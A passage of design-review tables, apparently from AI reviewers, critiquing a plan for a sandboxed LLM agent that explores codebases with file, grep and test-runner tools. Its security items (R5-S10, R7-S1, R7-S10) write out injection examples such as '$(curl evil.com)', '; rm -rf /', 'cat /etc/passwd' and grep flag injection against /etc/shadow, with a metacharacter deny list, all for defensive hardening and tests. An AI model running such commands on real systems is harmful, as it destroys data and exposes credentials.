| R5-S9 | architecture | medium | The plan uses synchronous `Anthropic` client (Section 3) and notes that handlers run in `ThreadPoolExecutor`. However, if multiple features use `ExplorePhaseHandler` concurrently (e.g., `supports_feature_serial = False` in a batch run), each handler instance creates its own `Anthropic` client. The plan doesn't specify whether the client should be shared (connection pooling) or per-instance (simpler but wasteful). More critically, `ExplorePhaseHandler` takes `project_root: Path` — if two features share the same project root and both run `_run_test`, they may interfere with each other (e.g., test database state, file locks). | The base class sets `supports_feature_serial = False`, but ExplorePhaseHandler operates on a shared filesystem. Concurrent `run_test` invocations against the same project can produce flaky results. This is a correctness issue for batch mode, not just a performance concern. | Section 3 (Decision) — document that `ExplorePhaseHandler` should set `supports_feature_serial = True` by default since tools operate on shared mutable state (test execution). Section 11 (Risks) — add concurrent execution risk. | Unit test: verify `ExplorePhaseHandler.supports_feature_serial == True`. Integration test: two concurrent explore phases don't corrupt each other's test results. |
| R5-S10 | security | medium | The `_run_test` whitelist regex in Section 5 allows `shell=True` with `subprocess.run`. Even with a strictly anchored whitelist, `shell=True` enables shell expansion of environment variables and subshells. For example, if the LLM crafts a command like `python3 -m pytest $(curl evil.com)`, the anchored regex `^python3\s+-m\s+pytest` would match the prefix. The regex must either reject commands containing shell metacharacters (`$`, `` ` ``, `|`, `;`, `&`, `(`, `)`) or use `shell=False` with `shlex.split()`. | R4-F1 required "strictly anchored regex and forbid shell metacharacters" — the anchoring was addressed but the metacharacter prohibition is not enforced in the plan's Section 5 regex. The regex only validates the prefix, not the full command string. With `shell=True`, anything after the whitelisted prefix is interpreted by the shell. This is a residual gap from R4-F1's partial implementation. | Section 5 (`_run_test`) — add explicit shell metacharacter rejection OR switch to `shell=False` with `shlex.split()`. Section 6 (Sandboxing) — document the choice. | Unit test: `test_run_test_rejects_shell_metacharacters`, specifically test `python3 -m pytest $(malicious)`, `python3 -m pytest; rm -rf /`, `python3 -m pytest | cat /etc/passwd`. |

**Endorsements** (prior untriaged suggestions this reviewer agrees with):
- (No untriaged suggestions remain in Appendix C that are not already in Appendix A or B — all prior suggestions have been triaged.)

#### Feature Requirements Suggestions

| ID | Section | Issue Type | Description | Impact | Suggested Resolution |
| ---- | ---- | ---- | ---- | ---- | ---- |
| R5-F1 | Interface Design — `execute()` | Missing specification | The `execute()` method shows `response = self._call_llm(...)` but `_call_llm` is never defined as a method on the class — it's not abstract, not concrete, and not documented. Similarly, `_execute_tool`, `_calculate_cost`, and `_build_initial_message` are called but their signatures and contracts are unspecified in the requirements. These are internal implementation methods that subclass authors shouldn't override, but their behavior needs to be specified for the base class implementer. | The base class implementer must guess the contract of 4 undocumented private methods. `_call_llm` in particular has critical behavioral requirements (retry logic, timeout, error handling) that affect correctness. | Add a "Private Methods" subsection to the Interface Design section specifying signatures and contracts for `_call_llm`, `_execute_tool`, `_calculate_cost`, and `_build_initial_message` (the latter already flagged in R1-F2 but only as abstract — the others remain undocumented). |
| R5-F2 | Interface Design — `get_tools()` | Vendor lock-in | `get_tools()` returns Anthropic-specific tool format. The requirements explicitly say "Returns Anthropic tool_use format." If the SDK later needs to support OpenAI or other providers (which use a different tool schema with `"type": "function"` wrapper), every subclass must be rewritten. | Tight coupling to Anthropic's schema in the abstract interface makes multi-provider support a breaking change. This contradicts the plan's use of a `model` parameter that suggests provider flexibility. | Either: (a) document this as an intentional Anthropic-only design decision with a note that multi-provider support would require a schema translation layer, or (b) define a provider-neutral tool schema and add a `_to_anthropic_tools()` translation in the base class. Option (a) is recommended for v1 with a clear note. |
| R5-F3 | Tool Safety — `read_file` | Ambiguity | The tool's `input_schema` defines `path` as `"description": "Absolute path to file"` but the sandboxing section says paths are resolved relative to `project_root`. If the LLM sends a relative path (which it frequently does — e.g., `src/auth.py`), should it be rejected (schema says absolute) or resolved relative to `project_root` (which is more useful)? The requirement contradicts itself. | LLMs overwhelmingly produce relative paths. Requiring absolute paths means either (a) the system prompt must always include `project_root` for the LLM to construct absolute paths, or (b) most tool calls will fail. Neither is ideal. | Change the schema description to "Path to file (absolute or relative to project root)" and document that `_validate_path` resolves relative paths against `project_root` before validation. |
| R5-F4 | OTel Instrumentation | Missing specification | The requirements specify OTel spans emit `explore.fault_files` as `[str]` but OTel span attributes do not support list types in all backends. The OpenTelemetry specification supports `Sequence[str]` attributes, but some exporters (e.g., older Jaeger versions) flatten or drop them. | Traces may lose the most operationally important attribute (which files were identified as faulty) depending on the backend. | Specify that `explore.fault_files` should be serialized as a JSON string attribute (e.g., `'["src/auth.py","src/utils.py"]'`) for maximum backend compatibility, with a note that native list attributes may be used when backend support is confirmed. |
| R5-F5 | Context Flow | Missing specification | The context flow example shows `context["localization"]["relevant_code"]` as a dict mapping `"src/auth.py:73-85"` to code snippets. There's no size limit on this field. If the LLM copies large code blocks (hundreds of lines across multiple files), this inflates context for downstream phases, consuming their token budgets. | DESIGN and IMPLEMENT phases inherit the full `localization` dict. Oversized `relevant_code` wastes tokens in downstream prompts and could push them over their own budgets. | Add a size constraint to `ExplorePhaseOutput` validation: `relevant_code` total character count should be capped (e.g., 10,000 chars). `parse_final_output` should truncate if necessary. |

#### Requirements Coverage

| Feature Doc Section | Plan Step(s) | Coverage | Gaps |
| ---- | ---- | ---- | ---- |
| `ToolUsingPhaseHandler` base class with agent loop | Section 4, Phase 1 step 4 | Full | Private method contracts (`_call_llm`, `_execute_tool`, `_calculate_cost`) undocumented (R5-F1) |
| Tool registry (`get_tools`) | Section 4 (Abstract Methods), Section 5 | Full | Anthropic-specific format baked into abstract interface (R5-F2) |
| Agent loop (LLM → tool_use → execute → feedback → LLM) | Section 4 (Message Management, Stop Conditions) | Partial | No context window overflow handling (R5-S3). No API retry within loop (R5-S2). Malformed conversation on budget-exceeded-mid-tool_use (R5-S7). |
| Bounded iteration (max turns, token budget) | Section 4 (Stop Conditions), Section 6 (Resource Limits) | Full | Edge case interaction between max_iterations and token_budget not tested (R5-S7) |
| Full cost tracking (compatible with budget enforcement) | Section 11 Risk 3, R2-F1 applied, R4-F2 applied | Full | Unknown model pricing fallback unspecified (R5-S6) |
| OTel instrumentation per tool call | Section 7 | Full | List attribute compatibility issue (R5-F4). No structured logging (R5-S5). |
| `ExplorePhaseHandler` concrete implementation | Section 5, Phase 2 | Full | `search_codebase` input sanitization missing (R5-S1). Path description contradicts sandboxing (R5-F3). |
| Tool safety / sandboxing | Section 6 | Partial | Shell metacharacter injection in `run_test` not fully addressed (R5-S10). `search_codebase` ReDoS/glob injection not addressed (R5-S1). |
| Integration with Artisan Pipeline | Section 8 | Full | `supports_feature_serial` incorrectly set to `False` for filesystem-operating handler (R5-S9) |
| Context flow (EXPLORE → DESIGN → IMPLEMENT) | Section 8 (Context Flow) | Partial | No size constraint on `relevant_code` field (R5-F5). `parse_final_output` behavior on incomplete conversations unspecified (R5-S8). |
| Open Question 1 (run_test in Explore) | Section 5 (_run_test), Section 6 | Full | Decided yes with whitelist. Residual shell safety gap (R5-S10). |
| Open Question 2 (streaming) | Not addressed in plan | Full | Implicitly decided: no streaming for v1 (correct per requirements). |
| Open Question 3 (non-Python projects) | Not addressed in plan | None | Requirements asked about non-Python fallback. Plan doesn't address this. Acceptable for v1 but should be explicitly noted as out-of-scope. |

#### Review Round R6
- **Reviewer**: gemini-3 (gemini-3-pro-preview)
- **Date**: 2026-02-20 02:19:14 UTC
- **Scope**: Architecture-focused review

| ID | Area | Severity | Suggestion | Rationale | Proposed Placement | Validation Approach |
| ---- | ---- | ---- | ---- | ---- | ---- | ---- |
| R6-S1 | ops | high | Add `-I` (ignore binary) and default exclude directories (`.git`, `node_modules`, `venv`, `__pycache__`) to the `_search_codebase` grep command. | Running `grep -r` on a modern codebase without excludes will scan binary files and massive dependency trees, causing timeouts, massive token usage, or garbage output. | Section 5 (`_search_codebase`) | Create a test case with a dummy `node_modules` folder and ensure `search_codebase` does not return matches from within it. |
| R6-S2 | data | medium | Change `_run_test` output truncation to use a "Head + Tail" strategy (e.g., first 2.5k chars + last 2.5k chars) instead of just truncating the end. | Test failures and stack traces often appear at the very end of long CI/test logs. Simple truncation hides the actual error from the LLM. | Section 5 (`_run_test`) | Unit test `_run_test` with a mock command that produces 10k chars of output; verify the result contains the start and the end of the string. |
| R6-S3 | interfaces | medium | Update `parse_final_output` signature to accept `run_metadata` (containing `stop_reason`), enabling it to set the `partial` flag in the output context. | To satisfy accepted requirement R3-F4 (distinguishing "nothing found" from "timeout"), the parser needs to know if the loop completed naturally or was aborted. | Section 4 (Abstract Methods) & Section 5 | Verify that when `max_iterations` is hit, the output context contains `partial: True`. |
| R6-S4 | data | medium | Explicitly append a `... [TRUNCATED]` marker to the output of `_read_file` when the line cap is hit. | Without an explicit marker, the LLM treats the truncated file as the complete file, leading to hallucinations about missing code. | Section 5 (`_read_file`) | Unit test `_read_file` with a file larger than the limit; verify the output string ends with the truncation marker. |
| R6-S5 | data | high | Add `issue_description` to the `Explore` phase entry requirements in `context_schema.py`. | The `_build_initial_message` method relies on `issue_description` to tell the agent what to look for. Without this validation, the phase will start but the agent will have no goal. | Section 8 (Context Validation) | Integration test: verify workflow raises `ContextValidationError` if `issue_description` is missing from context. |
| R6-S6 | architecture | medium | Implement `BadRequestError` handling in the agent loop to catch Context Window exhaustion (distinct from token budget). | A token budget of 50k doesn't prevent hitting the model's context window limit (e.g., if history grows too large). This raises a 400 error which crashes the phase unless caught. | Section 4 (Agent Loop Implementation) | Mock an Anthropic API `BadRequestError` during the loop; verify it is caught and treated as a forced stop (preserving partial results) rather than crashing. |

#### Feature Requirements Suggestions
| ID | Section | Issue Type | Description | Impact | Suggested Resolution |
| ---- | ---- | ---- | ---- | ---- | ---- |
| R6-F1 | Interface Design | Missing Requirement | The `ExplorePhaseHandler` implicitly depends on `issue_description` (for the initial message) and `codebase_summary` (for the system prompt), but these are not listed as required inputs. | If these are missing from the context, the agent will run without a goal or map, wasting money and failing silently. | Explicitly list `issue_description` and `codebase_summary` as required keys in the `Context Flow` or `Integration` section. |
| R6-F2 | Resource Limits | Missing Requirement | The requirements specify a `token_budget` (cost control) but fail to address **Context Window** limits (technical constraint). | If the conversation history exceeds the model's context window, the API call will fail with a 400 error, crashing the workflow. | Add a requirement to handle context window exhaustion (e.g., "If context limit is reached, terminate loop gracefully and return partial results"). |

#### Requirements Coverage
| Feature Doc Section | Plan Step(s) | Coverage | Gaps |
| ---- | ---- | ---- | ---- |
| **Tool Registry** | Section 1, 5 | Full | - |
| **Agent Loop** | Section 4 | Full | Missing context window error handling (R6-F2). |
| **Bounded Iteration** | Section 6 | Full | - |
| **Cost Tracking** | Section 4, 11 | Full | - |
| **OTel Instrumentation** | Section 7 | Full | - |
| **Explore Tools** | Section 5 | Partial | `grep` needs binary/exclude safety (R6-S1); `run_test` needs head+tail truncation (R6-S2). |
| **Sandboxing** | Section 6 | Full | - |
| **Integration** | Section 8 | Partial | Missing `issue_description` in entry requirements (R6-S5). |
| **Context Flow** | Section 8 | Partial | `parse_final_output` needs metadata to support `partial` flag (R6-S3). |

#### Review Round R7

- **Reviewer**: claude-4 (claude-opus-4-6)
- **Date**: 2026-02-20 02:47:14 UTC
- **Scope**: Architecture-focused review

| ID | Area | Severity | Suggestion | Rationale | Proposed Placement | Validation Approach |
| ---- | ---- | ---- | ---- | ---- | ---- | ---- |
| R7-S1 | security | critical | `_search_codebase` uses `subprocess.run(["grep", ...])` with the `pattern` argument passed directly from LLM output. While this avoids `shell=True`, grep's `-e` flag is not used, meaning patterns starting with `-` can be interpreted as grep flags (e.g., `--include=/etc/passwd` or `-r /`). Additionally, grep accepts `--include` as an argument, so a crafted `pattern` could override the glob restriction. The pattern argument must be passed via `grep -e <pattern>` and the entire argument list must be validated to prevent flag injection. | Unlike `_run_test` which has a whitelist, `_search_codebase` has no input sanitization on the regex pattern beyond "restrict to project_root." A malicious or hallucinated LLM output like `pattern: "--include=../../etc/shadow -r /"` would bypass the project_root restriction at the grep level. This is a command injection vector through argument injection, distinct from the shell injection addressed by R4-F1. | Section 5, `_search_codebase` implementation. Add: (1) always use `grep -e` to force pattern interpretation, (2) validate that `pattern` and `file_glob` contain no characters that could be interpreted as grep flags, (3) use `--` to terminate flag parsing before the pattern argument. | Unit test: `test_search_pattern_with_leading_dash_not_interpreted_as_flag`. Unit test: `test_search_pattern_cannot_override_include_glob`. Verify grep invocation uses `["grep", "-rn", "--include=<glob>", "--", "-e", pattern, project_root]`. |
| R7-S2 | architecture | high | The plan specifies `_call_llm` uses the synchronous `Anthropic` client, but R5-S2 (accepted) added retry logic to `_call_llm`. The plan does not specify how retries interact with the token budget. If a request succeeds on the API side (tokens consumed, billed) but the response is lost due to a network timeout, a retry will double-count tokens on the billing side but the budget tracker only sees the retry's tokens. Conversely, if the API returns a 529 (overloaded) after partial processing, tokens may be consumed server-side but not reported to the client. | Accepted suggestions R5-S2 (retry logic) and R3-F1 (partial cost tracking on failure) create an interaction: retries can cause token budget accounting to diverge from actual API consumption. Over a 15-iteration loop, this drift compounds. The budget check (`total_input_tokens + total_output_tokens > token_budget`) becomes unreliable. | Section 4, after "Token Budget Check." Add: "On retryable errors where the API may have consumed tokens without returning usage data, increment a `token_uncertainty` counter by the estimated request size. The budget check should use `(total_tokens + token_uncertainty) > token_budget` to be conservative. Log a warning when uncertainty exceeds 10% of budget." | Unit test: `test_retry_after_timeout_accounts_for_token_uncertainty`. Test that after a simulated timeout + retry, the budget check uses the conservative estimate. |
| R7-S3 | data | high | `parse_final_output` is called after the loop exits, but the plan does not specify behavior when the loop exits due to `max_iterations` or `token_budget` exhaustion and the last message is a tool_result (user role), not an assistant message. In this case, there is no final assistant message containing the structured localization report. `parse_final_output` receives a message history ending in tool results, and the spec says "Extract the localization report from the final assistant message" — which may contain only a tool_use request, not a report. | This is a second-order effect of the bounded iteration design. R3-F4 (accepted) added confidence/partial fields but assumes `parse_final_output` receives *something* to parse. When budget/iteration limits hit mid-tool-use, the last assistant message is a tool_use request, not a summary. The parser has no structured output to extract. | Section 4, new stop condition handling. When the loop exits due to budget/iteration limits: (1) if the last message is a tool_result, make one final LLM call with a truncated system message saying "Budget exhausted. Summarize your findings so far in the required format." with `tools=[]` (no tools available) to force a text response, (2) deduct this "summary call" from a reserved token allocation (e.g., 2,000 tokens reserved from `token_budget`). | Unit test: `test_budget_exhaustion_triggers_summary_call`. Test that when token_budget is hit mid-tool-use, a final no-tools call is made. Verify the reserved token allocation is deducted from the usable budget at init time. |
| R7-S4 | interfaces | high | The `handle_tool_use` signature returns `str`, but R1-S4 (accepted) introduced `ToolResult` with `is_error` field. The requirements doc's abstract method signature still shows `-> str` return type. The plan must reconcile: if `handle_tool_use` returns `ToolResult`, the `tool_results` construction in `execute()` must check `is_error` and set the `"is_error"` field in the tool_result content block per Anthropic's API spec (which supports `"is_error": true` on tool_result blocks). Without this, the LLM cannot distinguish tool errors from successful results. | R1-S4 was accepted but its impact on the `execute()` loop logic and the Anthropic API tool_result format was not traced through. The Anthropic API supports `"is_error": true` on tool_result blocks, which changes LLM behavior (it won't retry failed tools unnecessarily). If we return ToolResult but don't propagate `is_error` to the API, we lose the benefit of the accepted suggestion. | Section 4, tool_results construction block. Update the tool_results append to: `{"type": "tool_result", "tool_use_id": block.id, "content": result.content, "is_error": result.is_error}`. Update `handle_tool_use` return type to `ToolResult` in the interface. | Unit test: `test_tool_error_propagates_is_error_to_api`. Mock an `is_error=True` ToolResult and verify the API receives the `is_error` field. Verify LLM behavior difference by checking the next request includes the error flag. |
| R7-S5 | ops | high | The plan places OTel iteration spans as children of `phase.explore`, but the plan does not address trace context propagation into `subprocess.run` calls for `_run_test` and `_search_codebase`. If the test runner or grep subprocess emits its own traces (e.g., pytest with OTel plugin), those traces will be orphaned — not connected to the explore phase trace. More practically, if `subprocess.run` hangs despite the timeout (zombie process), the parent span remains open, and the OTel exporter may batch-export incomplete spans. | This is a cross-cutting concern between ops (OTel) and architecture (subprocess management). R3-S7 (accepted) added error handling for the loop, and R4-S5 (accepted) likely added operational monitoring, but neither addresses the subprocess-OTel interaction. Zombie subprocesses from timed-out `grep` or `pytest` calls can leak resources and leave spans in a dirty state. | Section 7 (OTel) and Section 5 (_run_test, _search_codebase). Add: (1) subprocess calls must use `subprocess.Popen` with explicit `process.kill()` + `process.wait()` after timeout, not just `subprocess.run(timeout=...)` which sends SIGTERM but doesn't guarantee cleanup, (2) tool call OTel events should record `"process_killed": true` when timeout occurs, (3) set span status to ERROR when subprocess is killed. | Unit test: `test_subprocess_killed_after_timeout_not_just_sigterm`. Mock subprocess to hang, verify `.kill()` is called after timeout. Integration test: verify OTel event includes `process_killed` attribute on timeout. |
| R7-S6 | validation | medium | The unit test plan (Section 9) has no tests for the interaction between `_validate_path` and symlink race conditions (TOCTOU). The plan says "Symlinks resolved and checked" but between `resolve()` and `read_text()`, the symlink target can change. While this is a known limitation, the test plan should include a test that documents this as an accepted risk, and the implementation should use `os.open()` with `O_NOFOLLOW` where possible. | R1-S1 (accepted, security) likely added path validation, and the plan mentions symlink checking. But the test plan only has `test_read_file_symlink_escape_rejected` which tests static symlinks. A TOCTOU test would document that the race condition exists but is accepted for v1 (with a note for production hardening). | Section 9, `test_explore_handler.py`. Add: `test_symlink_toctou_documented_as_known_limitation` — a test that creates a symlink, starts a read, swaps the target mid-read, and documents the behavior. Also add to Section 6: "TOCTOU for symlinks is a known limitation in v1. Production deployments should use containerized execution with a read-only filesystem mount." | Test verifies current behavior and documents it. Not a pass/fail test but a characterization test that ensures the limitation is explicitly acknowledged. |
| R7-S7 | risks | medium | The plan assumes `PricingService.calculate_cost_breakdown()` (Risk 3) has pricing data for the model specified in `self.model`. If a user passes a model string that PricingService doesn't recognize (e.g., a new model release, a fine-tuned model ID, or a typo), cost calculation silently returns 0 or raises an exception. Neither behavior is documented. This interacts with R2-F1 (accepted: global budget integration) — if cost is reported as $0 due to unknown model, the global budget check never triggers. | This is a second-order risk from the interaction of Risk 3 (cost calculation) and R2-F1 (budget enforcement). If cost is silently $0 for unknown models, the safety net of budget enforcement is defeated. The plan should specify behavior when PricingService has no pricing data: (a) fail-open with a warning and estimated cost, or (b) fail-closed and refuse to run. | Section 11 (Risks). Add Risk 7: "Unknown Model Pricing." Specify that `_calculate_cost` must validate that PricingService returns non-zero pricing for `self.model` during `__init__()`. If no pricing exists, raise `ValueError` at construction time, not silently at runtime. | Unit test: `test_init_rejects_unknown_model_without_pricing`. Test that constructing with `model="nonexistent-model"` raises ValueError. Unit test: `test_cost_calculation_never_returns_zero_for_known_model`. |
| R7-S8 | data | medium | The `ExplorePhaseOutput` schema (Section 8) validates `fault_files`, `root_cause`, and `fix_approach` as required fields. R3-F4 (accepted) added `confidence` and `partial` fields. R5-F5 (accepted) capped `relevant_code` at 10K chars. However, `affected_tests` is in the context flow example but not listed as a validated field. If `affected_tests` is empty or missing, downstream phases (particularly IMPLEMENT) may not know which tests to verify the fix against. The schema should either validate `affected_tests` as required (possibly empty list) or document it as optional with downstream implications. | This is a gap between the context flow specification and the validation schema. The context flow example shows `affected_tests` as a key field, but the exit validation (Section 8) only checks `fault_files`, `root_cause`, and `fix_approach`. If the LLM doesn't produce `affected_tests`, the field is silently absent from context, and downstream IMPLEMENT phase has no test targets. | Section 8, `ExplorePhaseOutput` model. Add `affected_tests: list[str] = []` as a validated field with default empty list. Add `fix_approach: str` validation for minimum length (> 20 chars) to prevent degenerate outputs like "fix the bug." | Unit test: `test_explore_output_includes_affected_tests_default_empty`. Test: `test_explore_output_rejects_trivial_fix_approach`. |
| R7-S9 | architecture | medium | The plan specifies `max_tokens=8192` as a hardcoded value in `_call_llm` (Section 3). This interacts poorly with R6-F2 (accepted: context window exhaustion handling). As the conversation grows, the available space for the response shrinks. With 200K context window and a 15-iteration loop accumulating tool results, the conversation can grow to 100K+ tokens. Setting `max_tokens=8192` is fine early but may be wasteful to reserve late in the loop when only a summary is needed. More critically, if the conversation fills the context window minus `max_tokens`, the API will reject the request. The plan should dynamically calculate `max_tokens` based on remaining context window space. | R6-F2 was accepted to handle context window exhaustion, but the plan's hardcoded `max_tokens=8192` means the exhaustion happens 8192 tokens earlier than necessary (the API reserves `max_tokens` from the context window). Dynamic `max_tokens` calculation — e.g., `min(8192, remaining_context_window - conversation_tokens)` — both prevents the API error and allows the full context window to be used for conversation history. | Section 3, API Call Pattern. Change `max_tokens=8192` to `max_tokens=min(self.max_response_tokens, model_context_window - estimated_conversation_tokens)`. Add `max_response_tokens: int = 8192` as a constructor parameter. Add conversation token estimation using a simple heuristic (sum of message content lengths / 4) or the Anthropic token counting API. | Unit test: `test_max_tokens_decreases_as_conversation_grows`. Test that late-loop API calls use smaller max_tokens. Test: `test_api_call_fails_gracefully_when_context_nearly_full`. |
| R7-S10 | security | medium | The `_run_test` whitelist regex in Section 5 does not account for environment variable injection. A command like `PYTHONPATH=/malicious python3 -m pytest` would match the regex (it starts with valid prefix after the env var assignment) depending on how `shell=True` parses it. Similarly, backtick substitution (`python3 -m pytest $(malicious_command)`) and `$()` subshell syntax can embed arbitrary execution within an otherwise-whitelisted command. R4-F1 (accepted) requires anchoring, but anchoring alone doesn't prevent inline subshell expansion when `shell=True` is used. | R4-F1 addressed anchoring the whitelist regex, and R3-F3 acknowledged that full isolation isn't achievable in v1. However, the gap between "anchored whitelist" and "shell=True execution" is still exploitable via shell features (subshells, env vars, backticks). The LLM can hallucinate these patterns even without malicious intent. The simplest fix: reject commands containing shell metacharacters `$`, `` ` ``, `|`, `;`, `&`, `(`, `)`, `{`, `}`, `<`, `>` before applying the whitelist regex. | Section 5, `_run_test`. Add pre-whitelist validation: reject any command containing shell metacharacters from the set `` $`|;&(){}<> ``. This is a defense-in-depth measure on top of the anchored whitelist. Document that `shell=True` is used for PATH resolution but the metacharacter ban prevents shell feature exploitation. | Unit test: `test_run_test_rejects_subshell_in_command` (`pytest $(whoami)`). Unit test: `test_run_test_rejects_env_var_prefix` (`PYTHONPATH=/x pytest`). Unit test: `test_run_test_rejects_backtick_substitution`. Unit test: `test_run_test_rejects_pipe_chain`. |

**Endorsements** (prior untriaged suggestions this reviewer agrees with):
- None — all prior Appendix C suggestions have been triaged into Appendix A or B.

#### Feature Requirements Suggestions

| ID | Section | Issue Type | Description | Impact | Suggested Resolution |
| ---- | ---- | ---- | ---- | ---- | ---- |
| R7-F1 | Interface Design — `execute()` | Missing specification | The `execute()` method is documented as "Do not override" but Python has no mechanism to enforce this on non-`__dunder__` methods. A subclass that accidentally overrides `execute()` (e.g., to add logging) will silently break the agent loop, cost tracking, and OTel instrumentation. The requirements should specify enforcement strategy. | Subclass authors unfamiliar with the codebase may override `execute()` thinking they can customize behavior, breaking all the safety invariants the base class provides. | Either: (a) add a `__init_subclass__` check that raises `TypeError` if a subclass defines `execute`, or (b) rename the non-overridable method to `_run_agent_loop` and have `execute()` be a thin wrapper that calls it. Option (a) is simpler and matches the "do not override" intent. |
| R7-F2 | Context Flow | Missing specification | The requirements specify that `context["localization"]` is written by EXPLORE and read by DESIGN, but they don't specify whether EXPLORE should *merge* with or *replace* an existing `context["localization"]` if one exists (e.g., from a previous run, a manual override, or a checkpoint restore). If the workflow is resumed from a checkpoint that already has localization data, does EXPLORE overwrite it? | Checkpoint restore + re-run could lose manually-curated localization data. Conversely, stale localization from a failed run could persist if EXPLORE errors out before writing. | Specify that EXPLORE always writes `context["localization"]`, replacing any existing value. If preserving prior localization is needed, the orchestrator should skip the EXPLORE phase (which is already possible since EXPLORE is not in `ordered()`). Document this as an explicit design decision. |
| R7-F3 | Interface Design — `get_tools()` | Missing constraint | The requirements specify `get_tools()` returns a list of tool definitions, but there is no validation that the returned tools have unique names. If a subclass returns two tools with the same `name`, the Anthropic API may accept it but `handle_tool_use` dispatch becomes ambiguous. | Duplicate tool names cause silent misbehavior where the wrong tool handler is invoked. The base class should validate tool name uniqueness at the start of `execute()`. | Add to `execute()` before the loop: validate that all tool names from `get_tools()` are unique. Raise `ValueError` if duplicates detected. This is a cheap check that prevents subtle bugs. |
| R7-F4 | Tool Safety — `search_codebase` | Missing specification | The `search_codebase` tool accepts a `pattern` parameter described as "Regex pattern" but the requirements don't specify any validation or sanitization of the regex. A catastrophic backtracking regex (e.g., `(a+)+$`) can cause `grep` to hang, consuming CPU until the tool timeout. More concerning, the `file_glob` parameter could contain shell glob characters that behave unexpectedly with `--include`. | LLM-generated regex patterns are frequently malformed or pathological. Without input validation, a single bad pattern can hang `grep` for the full 30-second timeout on every file in the project. | Add regex pre-validation: (1) attempt `re.compile(pattern)` to verify it's valid regex, (2) reject patterns exceeding 200 characters, (3) reject `file_glob` values containing path separators or `..`. |

#### Requirements Coverage

| Feature Doc Section | Plan Step(s) | Coverage | Gaps |
| ---- | ---- | ---- | ---- |
| AbstractPhaseHandler (existing — unchanged) | Section 1, Section 8 | Full | None — plan correctly treats this as unchanged. |
| ToolUsingPhaseHandler class definition | Section 2 (tool_using_handler.py), Section 4 | Full | Constructor parameters, abstract methods, and agent loop all addressed. |
| ToolUsingPhaseHandler.get_tools() | Section 4 (Abstract Methods), Section 5 | Full | Defined as abstract, implemented in ExplorePhaseHandler. **Gap**: No uniqueness validation on returned tool names (see R7-F3). |
| ToolUsingPhaseHandler.handle_tool_use() | Section 4, Section 5 | Partial | Return type mismatch: requirements say `-> str`, R1-S4 introduced ToolResult. Plan Section 5 still says "return error string." Needs reconciliation (see R7-S4). |
| ToolUsingPhaseHandler.get_system_prompt() | Section 4, Section 5 (ExplorePhaseHandler) | Full | Abstract method with concrete implementation. |
| ToolUsingPhaseHandler.parse_final_output() | Section 4, Risk 4 | Partial | Happy path covered. **Gap**: Behavior when loop exits mid-tool-use not specified (see R7-S3). |
| ToolUsingPhaseHandler.execute() — agent loop | Section 4 | Full | Stop conditions, message management, token budget check all specified. |
| ExplorePhaseHandler — 4 tools | Section 5 | Full | All four tools specified with implementation details. **Gap**: grep argument injection (R7-S1), regex validation (R7-F4). |
| Tool Safety — Sandboxing | Section 6 | Full | Path restriction, resource limits, no destructive ops. R3-F3 resolved network access honesty. **Gap**: TOCTOU for symlinks (R7-S6). |
| Tool Safety — Resource Limits | Section 6 | Full | All limits specified with defaults and enforcement. **Gap**: `max_tokens` hardcoded doesn't interact well with context window limits (R7-S9). |
| Tool Safety — No Destructive Operations | Section 5, Section 6 | Partial | Command whitelist specified. **Gap**: Shell metacharacter bypass (R7-S10). |
| OTel Instrumentation — per-iteration | Section 7 | Full | Spans, attributes, events all specified. **Gap**: Subprocess trace propagation (R7-S5). |
| OTel Instrumentation — phase-level | Section 7 | Full | All required attributes specified. |
| Integration — Phase Registration | Section 8 | Full | WorkflowPhase enum extension, backward compatibility addressed. |
| Integration — Context Flow | Section 8 | Partial | Happy path specified. **Gap**: Overwrite-vs-merge semantics on checkpoint restore (R7-F2). |
| Estimated Effort | Section 12 | Full | 2-day sequencing with optional Day 3 polish. |
| Dependencies | Section 2 (Files to Modify) | Full | No new external dependencies. |
| Open Question 1 (run_test in Explore) | Section 5 | Full | Included with whitelist. |
| Open Question 2 (streaming) | Section 3 | Full | Synchronous client chosen — no streaming. |
| Open Question 3 (non-Python projects) | Not addressed | None | The plan does not mention non-Python project support or fallback behavior. The requirements note this as an open question but the plan should at least document the limitation. |

#### Review Round R8

- **Reviewer**: gemini-3 (gemini-3-pro-preview)
- **Date**: 2026-02-20 02:49:35 UTC
- **Scope**: Architecture-focused review

#### Feature Requirements Suggestions
| ID | Section | Issue Type | Description | Impact | Suggested Resolution |
| ---- | ---- | ---- | ---- | ---- | ---- |
| R8-F1 | Interface Design | Robustness | The example system prompt instructs the agent to "respond with a structured localization report" as text, and `parse_final_output` extracts it. Free-text parsing is fragile compared to structured tool calls. | The agent may output valid text that fails regex parsing (e.g., markdown formatting, conversational filler), causing the phase to fail despite finding the bug. | Update requirements to recommend a `submit_report` tool (or similar) as the primary mechanism for returning the final structured result, using `parse_final_output` to extract the tool payload. |

#### Requirements Coverage
| Feature Doc Section | Plan Step(s) | Coverage | Gaps |
| :--- | :--- | :--- | :--- |
| **Tool-Using Phase Handler** | | | |
| Tool registry | Section 5 (Impl) | Full | |
| Agent loop | Section 4 | Full | |
| Bounded iteration | Section 6 | Full | |
| Cost tracking | Section 4 | Full | |
| OTel instrumentation | Section 7 | Full | |
| **ExplorePhaseHandler** | | | |
| `get_tools` | Section 5 | Full | `_search_codebase` lacks `.gitignore` support (R8-S1). |
| `handle_tool_use` | Section 5 | Full | |
| `get_system_prompt` | Section 5 | Full | |
| `parse_final_output` | Section 5 | Partial | Relies on text parsing; fragile (R8-S4). |
| **Tool Safety** | | | |
| Sandboxing | Section 6 | Full | |
| Resource Limits | Section 6 | Partial | Output size caps are line-based, not token/char-based (R8-S2). |
| No Destructive Ops | Section 6 | Full | |
| **Integration** | Section 8 | Full | |

| ID | Area | Severity | Suggestion | Rationale | Proposed Placement | Validation Approach |
| ---- | ---- | ---- | ---- | ---- | ---- | ---- |
| R8-S1 | Ops | High | Enforce `.gitignore` and hidden directory exclusion in `_search_codebase` and `_list_directory`. | Standard `grep` and `rglob` do not ignore `node_modules`, `.git`, or `venv` by default. Searching these directories wastes massive tokens, slows execution, and confuses the agent with library code. | Section 5 (`_search_codebase`, `_list_directory`) | Create a test case with a dummy `node_modules` folder and ensure `search_codebase` returns no hits from it. |
| R8-S2 | Security | Medium | Implement strict character or token caps on tool outputs (in addition to line caps). | A 10,000-line file (allowed by the plan) could be 10MB+ of text if lines are long, causing the *next* API call to crash (context limit) or burn the entire budget. | Section 5 (`_read_file`, `_search_codebase`) | Test reading a file with 100 lines of 100KB each; verify output is truncated to a safe total size (e.g., 100KB). |
